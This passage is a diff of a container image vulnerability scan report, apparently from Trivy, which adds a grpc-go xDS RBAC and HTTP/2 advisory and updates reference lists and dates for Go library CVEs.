+│                        │     │                   If upgrading grpc-go immediately is not possible, apply the
+│                        │     │                   following workarounds based on your deployment
+│                        │     │                   architecture:
+│                        │     │                   * For xDS RBAC Vulnerabilities & Panics: Ensure that
+│                        │     │                   upstream xDS management servers do not push RBAC policies
+│                        │     │                   containing `Metadata`, `RequestedServerName`, or `NOT` rules
+│                        │     │                    wrapping unsupported fields (such as `SourcedMetadata`) to
+│                        │     │                   grpc-go servers.
+│                        │     │                   * For HTTP/2 Rapid Reset DOS: Configure upstream reverse
+│                        │     │                   proxies or load balancers (such as Envoy) with strict HTTP/2
+│                        │     │                    `max_concurrent_streams` limits and active rate limiting on
+│                        │     │                    `RST_STREAM` frequency per connection.
+│                        │     │                   ### Severity
+│                        │     │                     | Vulnerability | Qualitative Severity | Approximate CVSS
+│                        │     │                   v3.1 Score | Primary Impact |
+│                        │     │                     | :--- | :--- | :--- | :--- |
+│                        │     │                     | **xDS RBAC Authorization Bypass** | **High** | `8.2` |
+│                        │     │                   Unauthorized Access / Fail-Open |
+│                        │     │                     | **HTTP/2 Rapid Reset DOS Bypass** | **High** | `7.5` |
+│                        │     │                   High CPU Consumption / Denial of Service |
+│                        │     │                     | **xDS RBAC Engine Server Panic** | **Medium** | `5.9` |
+│                        │     │                   Process Crash / Denial of Service | 
+│                        │     ├ Severity        : HIGH 
+│                        │     ├ VendorSeverity   ─ ghsa: 3 
+│                        │     ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI
+│                        │     │                         │            :H/VA:H/SC:N/SI:N/SA:N 
+│                        │     │                         ╰ V40Score : 8.8 
+│                        │     ├ References       ╭ [0]: https://github.com/grpc/grpc-go 
+│                        │     │                  ├ [1]: https://github.com/grpc/grpc-go/commit/4ea465d4ab98013
+│                        │     │                  │      f72a142fe0fc89c19770b2935 
+│                        │     │                  ├ [2]: https://github.com/grpc/grpc-go/pull/9236 
+│                        │     │                  ├ [3]: https://github.com/grpc/grpc-go/releases/tag/v1.82.1 
+│                        │     │                  ╰ [4]: https://github.com/grpc/grpc-go/security/advisories/GH
+│                        │     │                         SA-hrxh-6v49-42gf 
+│                        │     ├ PublishedDate   : 2026-07-21T22:03:55Z 
+│                        │     ╰ LastModifiedDate: 2026-07-21T22:03:56Z 
+│                        ├ [8] ╭ VulnerabilityID : CVE-2026-39822 
 │                        │     ├ VendorIDs        ─ [0]: GO-2026-4970 
 │                        │     ├ PkgID           : stdlib@v1.26.4 
 │                        │     ├ PkgName         : stdlib 
@@ -5648,6 +6554,7 @@
 │                        │     ├ Severity        : HIGH 
 │                        │     ├ CweIDs           ─ [0]: CWE-61 
 │                        │     ├ VendorSeverity   ╭ alma       : 3 
+│                        │     │                  ├ amazon     : 2 
 │                        │     │                  ├ bitnami    : 3 
 │                        │     │                  ├ oracle-oval: 3 
 │                        │     │                  ├ redhat     : 3 
@@ -5677,7 +6584,7 @@
 │                        │     │                  ╰ [14]: https://www.cve.org/CVERecord?id=CVE-2026-39822 
 │                        │     ├ PublishedDate   : 2026-07-08T17:17:21.31Z 
 │                        │     ╰ LastModifiedDate: 2026-07-13T14:54:26.317Z 
-│                        ╰ [8] ╭ VulnerabilityID : CVE-2026-42505 
+│                        ╰ [9] ╭ VulnerabilityID : CVE-2026-42505 
 │                              ├ VendorIDs        ─ [0]: GO-2026-5856 
 │                              ├ PkgID           : stdlib@v1.26.4 
 │                              ├ PkgName         : stdlib 
@@ -5704,7 +6611,8 @@
 │                              │                   client hello. 
 │                              ├ Severity        : MEDIUM 
 │                              ├ CweIDs           ─ [0]: CWE-201 
-│                              ├ VendorSeverity   ╭ bitnami: 2 
+│                              ├ VendorSeverity   ╭ amazon : 2 
+│                              │                  ├ bitnami: 2 
 │                              │                  ╰ redhat : 2 
 │                              ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:
 │                              │                  │         │           N/A:N 
@@ -5760,32 +6668,158 @@
 │                        │     ├ Severity        : UNKNOWN 
 │                        │     ╰ References       ╭ [0]: https://go.dev/issue/44226 
 │                        │                        ╰ [1]: https://pkg.go.dev/vuln/GO-2026-5932 
-│                        ╰ [1] ╭ VulnerabilityID : CVE-2026-56852 
-│                              ├ VendorIDs        ─ [0]: GO-2026-5970 
-│                              ├ PkgID           : golang.org/x/text@v0.38.0 
-│                              ├ PkgName         : golang.org/x/text 
-│                              ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/text@v0.38.0 
-│                              │                  ╰ UID : 5f4ce3a80e850c83 
-│                              ├ InstalledVersion: v0.38.0 
-│                              ├ FixedVersion    : 0.39.0 
+│                        ├ [1] ╭ VulnerabilityID : CVE-2026-56852 
+│                        │     ├ VendorIDs        ─ [0]: GO-2026-5970 
+│                        │     ├ PkgID           : golang.org/x/text@v0.38.0 
+│                        │     ├ PkgName         : golang.org/x/text 
+│                        │     ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/text@v0.38.0 
+│                        │     │                  ╰ UID : 5f4ce3a80e850c83 
+│                        │     ├ InstalledVersion: v0.38.0 
+│                        │     ├ FixedVersion    : 0.39.0 
+│                        │     ├ Status          : fixed 
+│                        │     ├ Layer            ╭ Digest: sha256:96f699030922861f53553074c8a6210954e2bd75c1a1
+│                        │     │                  │         97d9e39c5494d4581e40 
+│                        │     │                  ╰ DiffID: sha256:fcd2c7fef86c2f43de5fcc8026ed4bdf99aae7dd561d
+│                        │     │                            f117adb7086d939b6bf5 
+│                        │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-56852 
+│                        │     ├ DataSource       ╭ ID  : govulndb 
+│                        │     │                  ├ Name: The Go Vulnerability Database 
+│                        │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
+│                        │     ├ Fingerprint     : sha256:9ec79467fcea9ce7f7b3f090f4a23ef750ffc059f9fbc53338ebf
+│                        │     │                   e6a7145c008 
+│                        │     ├ Title           : Infinite loop on invalid input in golang.org/x/text 
+│                        │     ├ Description     : A norm.Iter can enter an infinite loop when handling input
+│                        │     │                   containing invalid UTF-8 bytes. 
+│                        │     ├ Severity        : UNKNOWN 
+│                        │     ├ References       ╭ [0]: https://go.dev/cl/794100 
+│                        │     │                  ├ [1]: https://go.dev/issue/80142 
+│                        │     │                  ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5970 
+│                        │     ├ PublishedDate   : 2026-07-21T20:17:02.867Z 
+│                        │     ╰ LastModifiedDate: 2026-07-21T20:17:02.867Z 
+│                        ╰ [2] ╭ VulnerabilityID : GHSA-hrxh-6v49-42gf 
+│                              ├ PkgID           : google.golang.org/grpc@v1.81.1 
+│                              ├ PkgName         : google.golang.org/grpc 
+│                              ├ PkgIdentifier    ╭ PURL: pkg:golang/google.golang.org/grpc@v1.81.1 
+│                              │                  ╰ UID : 9b09cea1f98c60ad 
+│                              ├ InstalledVersion: v1.81.1 
+│                              ├ FixedVersion    : 1.82.1 
 │                              ├ Status          : fixed 
 │                              ├ Layer            ╭ Digest: sha256:96f699030922861f53553074c8a6210954e2bd75c1a1
 │                              │                  │         97d9e39c5494d4581e40 
 │                              │                  ╰ DiffID: sha256:fcd2c7fef86c2f43de5fcc8026ed4bdf99aae7dd561d
 │                              │                            f117adb7086d939b6bf5 
-│                              ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-56852 
-│                              ├ DataSource       ╭ ID  : govulndb 
-│                              │                  ├ Name: The Go Vulnerability Database 
-│                              │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│                              ├ Fingerprint     : sha256:9ec79467fcea9ce7f7b3f090f4a23ef750ffc059f9fbc53338ebf
-│                              │                   e6a7145c008 
-│                              ├ Title           : Infinite loop on invalid input in golang.org/x/text 
-│                              ├ Description     : A norm.Iter can enter an infinite loop when handling input
-│                              │                   containing invalid UTF-8 bytes. 
-│                              ├ Severity        : UNKNOWN 
-│                              ╰ References       ╭ [0]: https://go.dev/cl/794100 
-│                                                 ├ [1]: https://go.dev/issue/80142 
-│                                                 ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5970 
+│                              ├ SeveritySource  : ghsa 
+│                              ├ PrimaryURL      : https://github.com/advisories/GHSA-hrxh-6v49-42gf 
+│                              ├ DataSource       ╭ ID  : ghsa 
+│                              │                  ├ Name: GitHub Security Advisory Go 
+│                              │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
+│                              │                          cosystem%3Ago 
+│                              ├ Fingerprint     : sha256:f2463c0fd3696a02fec8edc0a17b28e2936096999eccbbf02a568
+│                              │                   63dbf316126 
+│                              ├ Title           : gRPC-Go: xDS RBAC and HTTP/2 Vulnerabilities 
+│                              ├ Description     : Multiple security vulnerabilities have been identified and
+│                              │                   addressed in grpc-go affecting the xDS RBAC authorization
+│                              │                   engine (internal/xds/rbac) and the HTTP/2 transport server
+│                              │                   implementation (internal/transport). These vulnerabilities
+│                              │                   could result in:
+│                              │                   
+│                              │                   - Authorization Bypass (Fail-Open) when translating xDS RBAC
+│                              │                    policies containing `Metadata` or `RequestedServerName`
+│                              │                   fields.
+│                              │                   - Denial of Service (High CPU Consumption) due to an HTTP/2
+│                              │                   Rapid Reset mitigation bypass during client-initiated stream
+│                              │                    resets.
+│                              │                   - Denial of Service (Server Panic) when parsing crafted xDS
+│                              │                   RBAC policies containing `NOT` rules around unsupported
+│                              │                   ### Impact
+│                              │                   _What kind of vulnerability is it? Who is impacted?_
+│                              │                   #### xDS RBAC Authorization Bypass via `Metadata` &
+│                              │                   `RequestedServerName` matchers
+│                              │                   - Affected Component: xDS RBAC 
+│                              │                   - Impact: When building policy matchers for gRPC RBAC from
+│                              │                   xDS configurations, unsupported `permission` and `principal`
+│                              │                    rules (specifically `Metadata` and `RequestedServerName`)
+│                              │                   were silently ignored and treated as no-ops.
+│                              │                     - If an authorization policy relied purely on these
+│                              │                   matchers for access control, treating those rules as no-ops
+│                              │                   effectively removed the restrictions.
+│                              │                   - If these unsupported rules were nested inside logical
+│                              │                   `NOT` rules (`Permission_NotRule` / `Principal_NotId`) or
+│                              │                   multi-condition `OR/AND` rules, silently dropping them
+│                              │                   changed the boolean logic flow of the authorization engine.
+│                              │                   As a result, policy evaluation decisions could fail open,
+│                              │                   allowing unauthorized clients to access protected gRPC
+│                              │                   services or resources.
+│                              │                   #### HTTP/2 Rapid Reset Mitigation Bypass / Denial of
+│                              │                   Service via Stream Aborts
+│                              │                   - Affected Component: HTTP/2 transport
+│                              │                   - Impact: Earlier mitigations in grpc-go for HTTP/2 Rapid
+│                              │                   Reset only applied threshold checks to items that directly
+│                              │                   resulted in control frames being written back to the wire,
+│                              │                   such as `SETTINGS` ACKs or server-initiated `RST_STREAM`s.
+│                              │                   When a client initiated a rapid flood of stream creation
+│                              │                   (`HEADERS`) immediately followed by stream termination
+│                              │                   `RST_STREAM`, items queued up in the control buffer without
+│                              │                   counting against the transport response frame threshold. An
+│                              │                   attacker can repeatedly trigger this flood sequence to
+│                              │                   bypass reader blocking, resulting in high CPU usage, and
+│                              │                   Denial of Service (DoS).
+│                              │                   #### Denial of Service (Panic) in xDS RBAC Engine via
+│                              │                   Unsupported Fields inside NOT Rules
+│                              │                   - Impact: The xDS RBAC policy translators recursively
+│                              │                   generate matchers for nested rules. When a `NOT` rule
+│                              │                   wrapped an unsupported or unhandled field (such as
+│                              │                   `SourcedMetadata`), the recursive step returned an empty
+│                              │                   matcher. This could result in a runtime panic when the RBAC
+│                              │                   engine attempts to authorize an incoming request.
+│                              │                   An attacker or misconfigured/malicious xDS management server
+│                              │                    delivering an LDS/RDS update containing a `NOT` rule around
+│                              │                    an unhandled field causes the gRPC server process to crash
+│                              │                   immediately (CWE-248 / Denial of Service).
+│                              │                   ### Patches
+│                              │                   _Has the problem been patched? What versions should users
+│                              │                   upgrade to?_
+│                              │                   All three issues have been fixed in `master` and will be
+│                              │                   released in 1.82.1 shortly.
+│                              │                   ### Workarounds
+│                              │                   _Is there a way for users to fix or remediate the
+│                              │                   vulnerability without upgrading?_
+│                              │                   If upgrading grpc-go immediately is not possible, apply the
+│                              │                   following workarounds based on your deployment
+│                              │                   architecture:
+│                              │                   * For xDS RBAC Vulnerabilities & Panics: Ensure that
+│                              │                   upstream xDS management servers do not push RBAC policies
+│                              │                   containing `Metadata`, `RequestedServerName`, or `NOT` rules
+│                              │                    wrapping unsupported fields (such as `SourcedMetadata`) to
+│                              │                   grpc-go servers.
+│                              │                   * For HTTP/2 Rapid Reset DOS: Configure upstream reverse
+│                              │                   proxies or load balancers (such as Envoy) with strict HTTP/2
+│                              │                    `max_concurrent_streams` limits and active rate limiting on
+│                              │                    `RST_STREAM` frequency per connection.
+│                              │                   ### Severity
+│                              │                     | Vulnerability | Qualitative Severity | Approximate CVSS
+│                              │                   v3.1 Score | Primary Impact |
+│                              │                     | :--- | :--- | :--- | :--- |
+│                              │                     | **xDS RBAC Authorization Bypass** | **High** | `8.2` |
+│                              │                   Unauthorized Access / Fail-Open |
+│                              │                     | **HTTP/2 Rapid Reset DOS Bypass** | **High** | `7.5` |
+│                              │                   High CPU Consumption / Denial of Service |
+│                              │                     | **xDS RBAC Engine Server Panic** | **Medium** | `5.9` |
+│                              │                   Process Crash / Denial of Service | 
+│                              ├ Severity        : HIGH 
+│                              ├ VendorSeverity   ─ ghsa: 3 
+│                              ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI
+│                              │                         │            :H/VA:H/SC:N/SI:N/SA:N 
+│                              │                         ╰ V40Score : 8.8 
+│                              ├ References       ╭ [0]: https://github.com/grpc/grpc-go 
+│                              │                  ├ [1]: https://github.com/grpc/grpc-go/commit/4ea465d4ab98013
+│                              │                  │      f72a142fe0fc89c19770b2935 
+│                              │                  ├ [2]: https://github.com/grpc/grpc-go/pull/9236 
+│                              │                  ├ [3]: https://github.com/grpc/grpc-go/releases/tag/v1.82.1 
+│                              │                  ╰ [4]: https://github.com/grpc/grpc-go/security/advisories/GH
+│                              │                         SA-hrxh-6v49-42gf 
+│                              ├ PublishedDate   : 2026-07-21T22:03:55Z 
+│                              ╰ LastModifiedDate: 2026-07-21T22:03:56Z 
 ├ [6]  ╭ Target         : usr/bin/helm 
 │      ├ Class          : lang-pkgs 
 │      ├ Type           : gobinary 
@@ -5880,7 +6914,7 @@
 │                              │                  ├ [7]: https://nvd.nist.gov/vuln/detail/CVE-2026-50163 
 │                              │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2026-50163 
 │                              ├ PublishedDate   : 2026-07-17T20:17:23.943Z 
-│                              ╰ LastModifiedDate: 2026-07-17T20:17:23.943Z 
+│                              ╰ LastModifiedDate: 2026-07-20T16:17:04.433Z 
 ├ [7]  ╭ Target         : usr/bin/kubectl 
 │      ├ Class          : lang-pkgs 
 │      ├ Type           : gobinary 
@@ -6097,29 +7131,30 @@
 │                        │      │                  ├ [5] : https://access.redhat.com/errata/RHSA-2026:33150 
 │                        │      │                  ├ [6] : https://access.redhat.com/errata/RHSA-2026:34342 
 │                        │      │                  ├ [7] : https://access.redhat.com/errata/RHSA-2026:37387 
-│                        │      │                  ├ [8] : https://access.redhat.com/security/cve/CVE-2026-33814 
-│                        │      │                  ├ [9] : https://bugzilla.redhat.com/show_bug.cgi?id=2467815 
-│                        │      │                  ├ [10]: https://github.com/golang/go/issues/78476 
-│                        │      │                  ├ [11]: https://go-review.googlesource.com/c/go/+/761581 
-│                        │      │                  ├ [12]: https://go-review.googlesource.com/c/net/+/761640 
-│                        │      │                  ├ [13]: https://go.dev/cl/761581 
-│                        │      │                  ├ [14]: https://go.dev/cl/761640 
-│                        │      │                  ├ [15]: https://go.dev/issue/78476 
-│                        │      │                  ├ [16]: https://groups.google.com/g/golang-announce/c/qcCIEX
+│                        │      │                  ├ [8] : https://access.redhat.com/errata/RHSA-2026:42644 
+│                        │      │                  ├ [9] : https://access.redhat.com/security/cve/CVE-2026-33814 
+│                        │      │                  ├ [10]: https://bugzilla.redhat.com/show_bug.cgi?id=2467815 
+│                        │      │                  ├ [11]: https://github.com/golang/go/issues/78476 
+│                        │      │                  ├ [12]: https://go-review.googlesource.com/c/go/+/761581 
+│                        │      │                  ├ [13]: https://go-review.googlesource.com/c/net/+/761640 
+│                        │      │                  ├ [14]: https://go.dev/cl/761581 
+│                        │      │                  ├ [15]: https://go.dev/cl/761640 
+│                        │      │                  ├ [16]: https://go.dev/issue/78476 
+│                        │      │                  ├ [17]: https://groups.google.com/g/golang-announce/c/qcCIEX
 │                        │      │                  │       so47M 
-│                        │      │                  ├ [17]: https://linux.oracle.com/cve/CVE-2026-33814.html 
-│                        │      │                  ├ [18]: https://linux.oracle.com/errata/ELSA-2026-22121.html 
-│                        │      │                  ├ [19]: https://nvd.nist.gov/vuln/detail/CVE-2026-33814 
-│                        │      │                  ├ [20]: https://pkg.go.dev/vuln/GO-2026-4918 
-│                        │      │                  ├ [21]: https://security.access.redhat.com/data/csaf/v2/vex/
+│                        │      │                  ├ [18]: https://linux.oracle.com/cve/CVE-2026-33814.html 
+│                        │      │                  ├ [19]: https://linux.oracle.com/errata/ELSA-2026-22121.html 
+│                        │      │                  ├ [20]: https://nvd.nist.gov/vuln/detail/CVE-2026-33814 
+│                        │      │                  ├ [21]: https://pkg.go.dev/vuln/GO-2026-4918 
+│                        │      │                  ├ [22]: https://security.access.redhat.com/data/csaf/v2/vex/
 │                        │      │                  │       2026/cve-2026-33814.json 
-│                        │      │                  ├ [22]: https://ubuntu.com/security/notices/USN-8430-1 
-│                        │      │                  ├ [23]: https://ubuntu.com/security/notices/USN-8471-1 
-│                        │      │                  ├ [24]: https://ubuntu.com/security/notices/USN-8472-1 
-│                        │      │                  ├ [25]: https://ubuntu.com/security/notices/USN-8473-1 
-│                        │      │                  ╰ [26]: https://www.cve.org/CVERecord?id=CVE-2026-33814 
+│                        │      │                  ├ [23]: https://ubuntu.com/security/notices/USN-8430-1 
+│                        │      │                  ├ [24]: https://ubuntu.com/security/notices/USN-8471-1 
+│                        │      │                  ├ [25]: https://ubuntu.com/security/notices/USN-8472-1 
+│                        │      │                  ├ [26]: https://ubuntu.com/security/notices/USN-8473-1 
+│                        │      │                  ╰ [27]: https://www.cve.org/CVERecord?id=CVE-2026-33814 
 │                        │      ├ PublishedDate   : 2026-05-07T20:16:42.88Z 
-│                        │      ╰ LastModifiedDate: 2026-07-15T02:20:18.21Z 
+│                        │      ╰ LastModifiedDate: 2026-07-21T12:18:10.55Z 
 │                        ├ [3]  ╭ VulnerabilityID : CVE-2026-39821 
 │                        │      ├ VendorIDs        ─ [0]: GO-2026-5026 
 │                        │      ├ PkgID           : golang.org/x/net@v0.49.0 
@@ -6212,40 +7247,58 @@
 │                        │      │                  ├ [44]: https://access.redhat.com/errata/RHSA-2026:39573 
 │                        │      │                  ├ [45]: https://access.redhat.com/errata/RHSA-2026:39879 
 │                        │      │                  ├ [46]: https://access.redhat.com/errata/RHSA-2026:40118 
-│                        │      │                  ├ [47]: https://access.redhat.com/errata/RHSA-2026:40119 
-│                        │      │                  ├ [48]: https://access.redhat.com/errata/RHSA-2026:40262 
-│                        │      │                  ├ [49]: https://access.redhat.com/errata/RHSA-2026:40945 
-│                        │      │                  ├ [50]: https://access.redhat.com/errata/RHSA-2026:41019 
-│                        │      │                  ├ [51]: https://access.redhat.com/errata/RHSA-2026:41030 
-│                        │      │                  ├ [52]: https://access.redhat.com/errata/RHSA-2026:41031 
-│                        │      │                  ├ [53]: https://access.redhat.com/errata/RHSA-2026:41036 
-│                        │      │                  ├ [54]: https://access.redhat.com/errata/RHSA-2026:41055 
-│                        │      │                  ├ [55]: https://access.redhat.com/errata/RHSA-2026:41066 
-│                        │      │                  ├ [56]: https://access.redhat.com/security/cve/CVE-2026-39821 
-│                        │      │                  ├ [57]: https://bugzilla.redhat.com/2480756 
-│                        │      │                  ├ [58]: https://bugzilla.redhat.com/show_bug.cgi?id=2480756 
-│                        │      │                  ├ [59]: https://bugzilla.redhat.com/show_bug.cgi?id=2498152 
-│                        │      │                  ├ [60]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2
+│                        │      │                  ├ [47]: https://access.redhat.com/errata/RHSA-2026:40262 
+│                        │      │                  ├ [48]: https://access.redhat.com/errata/RHSA-2026:40945 
+│                        │      │                  ├ [49]: https://access.redhat.com/errata/RHSA-2026:41019 
+│                        │      │                  ├ [50]: https://access.redhat.com/errata/RHSA-2026:41030 
+│                        │      │                  ├ [51]: https://access.redhat.com/errata/RHSA-2026:41031 
+│                        │      │                  ├ [52]: https://access.redhat.com/errata/RHSA-2026:41036 
+│                        │      │                  ├ [53]: https://access.redhat.com/errata/RHSA-2026:41055 
+│                        │      │                  ├ [54]: https://access.redhat.com/errata/RHSA-2026:41066 
+│                        │      │                  ├ [55]: https://access.redhat.com/errata/RHSA-2026:41928 
+│                        │      │                  ├ [56]: https://access.redhat.com/errata/RHSA-2026:41930 
+│                        │      │                  ├ [57]: https://access.redhat.com/errata/RHSA-2026:42043 
+│                        │      │                  ├ [58]: https://access.redhat.com/errata/RHSA-2026:42047 
+│                        │      │                  ├ [59]: https://access.redhat.com/errata/RHSA-2026:42048 
+│                        │      │                  ├ [60]: https://access.redhat.com/errata/RHSA-2026:42049 
+│                        │      │                  ├ [61]: https://access.redhat.com/errata/RHSA-2026:42050 
+│                        │      │                  ├ [62]: https://access.redhat.com/errata/RHSA-2026:42051 
+│                        │      │                  ├ [63]: https://access.redhat.com/errata/RHSA-2026:42078 
+│                        │      │                  ├ [64]: https://access.redhat.com/errata/RHSA-2026:42079 
+│                        │      │                  ├ [65]: https://access.redhat.com/errata/RHSA-2026:42080 
+│                        │      │                  ├ [66]: https://access.redhat.com/errata/RHSA-2026:42082 
+│                        │      │                  ├ [67]: https://access.redhat.com/errata/RHSA-2026:42132 
+│                        │      │                  ├ [68]: https://access.redhat.com/errata/RHSA-2026:42142 
+│                        │      │                  ├ [69]: https://access.redhat.com/errata/RHSA-2026:42146 
+│                        │      │                  ├ [70]: https://access.redhat.com/errata/RHSA-2026:42150 
+│                        │      │                  ├ [71]: https://access.redhat.com/errata/RHSA-2026:42151 
+│                        │      │                  ├ [72]: https://access.redhat.com/errata/RHSA-2026:42240 
+│                        │      │                  ├ [73]: https://access.redhat.com/errata/RHSA-2026:42644 
+│                        │      │                  ├ [74]: https://access.redhat.com/security/cve/CVE-2026-39821 
+│                        │      │                  ├ [75]: https://bugzilla.redhat.com/2480756 
+│                        │      │                  ├ [76]: https://bugzilla.redhat.com/show_bug.cgi?id=2480756 
+│                        │      │                  ├ [77]: https://bugzilla.redhat.com/show_bug.cgi?id=2498152 
+│                        │      │                  ├ [78]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2
 │                        │      │                  │       026-39821 
-│                        │      │                  ├ [61]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2
+│                        │      │                  ├ [79]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2
 │                        │      │                  │       026-39822 
-│                        │      │                  ├ [62]: https://errata.almalinux.org/9/ALSA-2026-37435.html 
-│                        │      │                  ├ [63]: https://errata.rockylinux.org/RLSA-2026:37435 
-│                        │      │                  ├ [64]: https://github.com/golang/go/issues/78760 
-│                        │      │                  ├ [65]: https://go.dev/cl/767220 
-│                        │      │                  ├ [66]: https://go.dev/issue/78760 
-│                        │      │                  ├ [67]: https://groups.google.com/g/golang-announce/c/iI-mYS
+│                        │      │                  ├ [80]: https://errata.almalinux.org/9/ALSA-2026-37435.html 
+│                        │      │                  ├ [81]: https://errata.rockylinux.org/RLSA-2026:37435 
+│                        │      │                  ├ [82]: https://github.com/golang/go/issues/78760 
+│                        │      │                  ├ [83]: https://go.dev/cl/767220 
+│                        │      │                  ├ [84]: https://go.dev/issue/78760 
+│                        │      │                  ├ [85]: https://groups.google.com/g/golang-announce/c/iI-mYS
 │                        │      │                  │       I0lu8 
-│                        │      │                  ├ [68]: https://linux.oracle.com/cve/CVE-2026-39821.html 
-│                        │      │                  ├ [69]: https://linux.oracle.com/errata/ELSA-2026-38995.html 
-│                        │      │                  ├ [70]: https://nvd.nist.gov/vuln/detail/CVE-2026-39821 
-│                        │      │                  ├ [71]: https://pkg.go.dev/vuln/GO-2026-5026 
-│                        │      │                  ├ [72]: https://security.access.redhat.com/data/csaf/v2/vex/
+│                        │      │                  ├ [86]: https://linux.oracle.com/cve/CVE-2026-39821.html 
+│                        │      │                  ├ [87]: https://linux.oracle.com/errata/ELSA-2026-39573.html 
+│                        │      │                  ├ [88]: https://nvd.nist.gov/vuln/detail/CVE-2026-39821 
+│                        │      │                  ├ [89]: https://pkg.go.dev/vuln/GO-2026-5026 
+│                        │      │                  ├ [90]: https://security.access.redhat.com/data/csaf/v2/vex/
 │                        │      │                  │       2026/cve-2026-39821.json 
-│                        │      │                  ├ [73]: https://ubuntu.com/security/notices/USN-8416-1 
-│                        │      │                  ╰ [74]: https://www.cve.org/CVERecord?id=CVE-2026-39821 
+│                        │      │                  ├ [91]: https://ubuntu.com/security/notices/USN-8416-1 
+│                        │      │                  ╰ [92]: https://www.cve.org/CVERecord?id=CVE-2026-39821 
 │                        │      ├ PublishedDate   : 2026-05-22T16:16:20.41Z 
-│                        │      ╰ LastModifiedDate: 2026-07-17T13:18:31.383Z 
+│                        │      ╰ LastModifiedDate: 2026-07-21T12:18:16.797Z 
 │                        ├ [4]  ╭ VulnerabilityID : CVE-2026-25680 
 │                        │      ├ VendorIDs        ─ [0]: GO-2026-5028 
 │                        │      ├ PkgID           : golang.org/x/net@v0.49.0 
@@ -6397,9 +7450,11 @@
 │                        │      ├ Description     : Parsing an invalid SVCB or HTTPS RR can panic when the size
 │                        │      │                    of a parameter value overflows the message buffer. 
 │                        │      ├ Severity        : UNKNOWN 
-│                        │      ╰ References       ╭ [0]: https://go.dev/cl/786345 
-│                        │                         ├ [1]: https://go.dev/issue/79795 
-│                        │                         ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5942 
+│                        │      ├ References       ╭ [0]: https://go.dev/cl/786345 
+│                        │      │                  ├ [1]: https://go.dev/issue/79795 
+│                        │      │                  ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5942 
+│                        │      ├ PublishedDate   : 2026-07-21T20:17:01.213Z 
+│                        │      ╰ LastModifiedDate: 2026-07-21T20:17:01.213Z 
 │                        ├ [8]  ╭ VulnerabilityID : CVE-2026-39824 
 │                        │      ├ VendorIDs        ─ [0]: GO-2026-5024 
 │                        │      ├ PkgID           : golang.org/x/sys@v0.40.0 
@@ -6458,9 +7513,11 @@
 │                        │      ├ Description     : A norm.Iter can enter an infinite loop when handling input
 │                        │      │                   containing invalid UTF-8 bytes. 
 │                        │      ├ Severity        : UNKNOWN 
-│                        │      ╰ References       ╭ [0]: https://go.dev/cl/794100 
-│                        │                         ├ [1]: https://go.dev/issue/80142 
-│                        │                         ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5970 
+│                        │      ├ References       ╭ [0]: https://go.dev/cl/794100 
+│                        │      │                  ├ [1]: https://go.dev/issue/80142 
+│                        │      │                  ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5970 
+│                        │      ├ PublishedDate   : 2026-07-21T20:17:02.867Z 
+│                        │      ╰ LastModifiedDate: 2026-07-21T20:17:02.867Z 
 │                        ├ [10] ╭ VulnerabilityID : CVE-2026-39822 
 │                        │      ├ VendorIDs        ─ [0]: GO-2026-4970 
 │                        │      ├ PkgID           : stdlib@v1.26.4 
@@ -6491,6 +7548,7 @@
 │                        │      ├ Severity        : HIGH 
 │                        │      ├ CweIDs           ─ [0]: CWE-61 
 │                        │      ├ VendorSeverity   ╭ alma       : 3 
+│                        │      │                  ├ amazon     : 2 
 │                        │      │                  ├ bitnami    : 3 
 │                        │      │                  ├ oracle-oval: 3 
 │                        │      │                  ├ redhat     : 3 
@@ -6547,7 +7605,8 @@
 │                               │                   client hello. 
 │                               ├ Severity        : MEDIUM 
 │                               ├ CweIDs           ─ [0]: CWE-201 
-│                               ├ VendorSeverity   ╭ bitnami: 2 
+│                               ├ VendorSeverity   ╭ amazon : 2 
+│                               │                  ├ bitnami: 2 
 │                               │                  ╰ redhat : 2 
 │                               ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I
 │                               │                  │         │           :N/A:N 
@@ -6781,29 +7840,30 @@
 │                        │      │                  ├ [5] : https://access.redhat.com/errata/RHSA-2026:33150 
 │                        │      │                  ├ [6] : https://access.redhat.com/errata/RHSA-2026:34342 
 │                        │      │                  ├ [7] : https://access.redhat.com/errata/RHSA-2026:37387 
-│                        │      │                  ├ [8] : https://access.redhat.com/security/cve/CVE-2026-33814 
-│                        │      │                  ├ [9] : https://bugzilla.redhat.com/show_bug.cgi?id=2467815 
-│                        │      │                  ├ [10]: https://github.com/golang/go/issues/78476 
-│                        │      │                  ├ [11]: https://go-review.googlesource.com/c/go/+/761581 
-│                        │      │                  ├ [12]: https://go-review.googlesource.com/c/net/+/761640 
-│                        │      │                  ├ [13]: https://go.dev/cl/761581 
-│                        │      │                  ├ [14]: https://go.dev/cl/761640 
-│                        │      │                  ├ [15]: https://go.dev/issue/78476 
-│                        │      │                  ├ [16]: https://groups.google.com/g/golang-announce/c/qcCIEX
+│                        │      │                  ├ [8] : https://access.redhat.com/errata/RHSA-2026:42644 
+│                        │      │                  ├ [9] : https://access.redhat.com/security/cve/CVE-2026-33814 
+│                        │      │                  ├ [10]: https://bugzilla.redhat.com/show_bug.cgi?id=2467815 
+│                        │      │                  ├ [11]: https://github.com/golang/go/issues/78476 
